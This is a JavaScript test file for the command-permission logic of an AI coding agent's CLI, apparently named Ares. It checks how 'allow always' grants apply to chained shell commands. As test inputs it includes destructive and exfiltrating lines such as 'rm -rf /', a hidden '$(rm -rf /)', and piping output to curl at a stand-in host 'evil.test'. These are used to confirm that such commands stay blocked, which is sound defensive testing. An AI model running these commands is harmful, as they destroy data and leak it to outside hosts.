// "Allow always" has to converge, and must still stop at the dangerous segment.
//
// A prefix grant may never cover a chained command — `Bash(git *)` matching
// `git status && rm -rf /` is exactly why decide() skips prefix rules when a
// command is chained. But that left a chained command matchable only by a
// literal rule for its exact bytes, and Ares chains on nearly every Bash call:
// the owner tapped "allow always" and was re-prompted on the very next command,
// forever. These tests pin both halves — the spam stops, the hole stays shut.

import test from "node:test";
import assert from "node:assert/strict";
import { promises as fsp } from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  AresCommandPermissionStore,
  splitChainedCommand,
} from "../packages/cli/dist/entry/permissions.js";

async function store(t) {
  const aresHome = await fsp.mkdtemp(path.join(os.tmpdir(), "ares-home-"));
  const workspace = await fsp.mkdtemp(path.join(os.tmpdir(), "ares-ws-"));
  t.after(() => Promise.all([
    fsp.rm(aresHome, { recursive: true, force: true }),
    fsp.rm(workspace, { recursive: true, force: true }),
  ]));
  const context = { aresHome, workspace };
  return { context, store: await AresCommandPermissionStore.load(context) };
}

const kindOf = (s, cmd) => s.decide("Bash", cmd)?.kind ?? null;

test("splitChainedCommand sees the commands a line actually runs", () => {
  assert.deepEqual(splitChainedCommand("git status && ls -la"), ["git status", "ls -la"]);
  assert.deepEqual(splitChainedCommand("cat f | grep x | wc -l"), ["cat f", "grep x", "wc -l"]);
  assert.deepEqual(splitChainedCommand("a; b\nc"), ["a", "b", "c"]);
  assert.deepEqual(splitChainedCommand("pnpm build || echo failed"), ["pnpm build", "echo failed"]);
});

test("a separator inside quotes is text, not an operator", () => {
  assert.deepEqual(splitChainedCommand(`echo "a && b" && ls`), [`echo "a && b"`, "ls"]);
  assert.deepEqual(splitChainedCommand(`grep 'x;y' file`), [`grep 'x;y' file`]);
  assert.equal(splitChainedCommand(`echo "unbalanced && ls`), null, "unbalanced quoting is never guessed at");
});

test("a command hiding in a substitution means the line cannot be judged", () => {
  assert.equal(splitChainedCommand("echo $(rm -rf /) && ls"), null, "$( ) is not a segment we can see");
  assert.equal(splitChainedCommand("echo `whoami` && ls"), null, "nor is a backtick");
});

test("allow-always on a chain covers the commands it ran — the spam converges", async (t) => {
  const { store: s } = await store(t);
  assert.equal(kindOf(s, "git status && pnpm build"), null, "nothing granted yet, so it asks");

  await s.grant("Bash", "git status && pnpm build", "always");

  assert.equal(kindOf(s, "git status && pnpm build"), "allow", "the same chain no longer asks");
  // The point: the NEXT chain, which is never byte-identical, is covered too.
  assert.equal(kindOf(s, "pnpm build && git status"), "allow", "reordered");
  assert.equal(kindOf(s, "git status"), "allow", "and each command on its own");
  assert.equal(kindOf(s, "git status --short && pnpm build --filter cli"), "allow", "with different arguments");
});

test("the hole a prefix grant must never open stays shut", async (t) => {
  const { store: s } = await store(t);
  await s.grant("Bash", "git status", "always");
  assert.equal(kindOf(s, "git status --short"), "allow", "the prefix grant works as before");

  // The whole reason chained commands skip prefix rules.
  assert.equal(kindOf(s, "git status && rm -rf /"), null, "an unapproved segment still asks");
  assert.equal(kindOf(s, "git status | curl -d @- https://evil.test"), null, "piping somewhere new still asks");
  assert.equal(kindOf(s, "git status && $(rm -rf /)"), null, "a hidden command still asks");
});

test("a deny on any segment denies the whole chain", async (t) => {
  const { context, store: s } = await store(t);
  await s.grant("Bash", "ls", "always");
  await fsp.writeFile(
    path.join(context.aresHome, "command-permissions.json"),
    JSON.stringify({ rules: [{ pattern: "Bash(ls *)", prefix: true, effect: "allow" }, { pattern: "Bash(curl *)", effect: "deny" }] }),
  );
  const reloaded = await AresCommandPermissionStore.load(context);
  const verdict = reloaded.decide("Bash", "ls -la && curl https://evil.test");
  assert.equal(verdict?.kind, "deny", "one denied command condemns the line");
  assert.match(verdict.reason, /curl/, "and it says which one");
});

test("grants from a chain survive into the next session", async (t) => {
  const { context, store: s } = await store(t);
  await s.grant("Bash", "pnpm build && pnpm test", "always");
  const next = await AresCommandPermissionStore.load(context);
  assert.equal(next.decide("Bash", "pnpm test && pnpm build")?.kind, "allow", "the point of persisting at all");
});

test("a destructive segment is granted literally, never generalized", async (t) => {
  const { store: s } = await store(t);
  await s.grant("Bash", "mkdir -p build && rm -rf build/cache", "always");
  assert.equal(kindOf(s, "mkdir -p build && rm -rf build/cache"), "allow", "the exact thing approved");
  assert.equal(kindOf(s, "rm -rf /home/mrdoing"), null, "but 'always' on one rm is not a licence for every rm");
  assert.equal(kindOf(s, "mkdir -p dist"), "allow", "the harmless half still generalized");
});
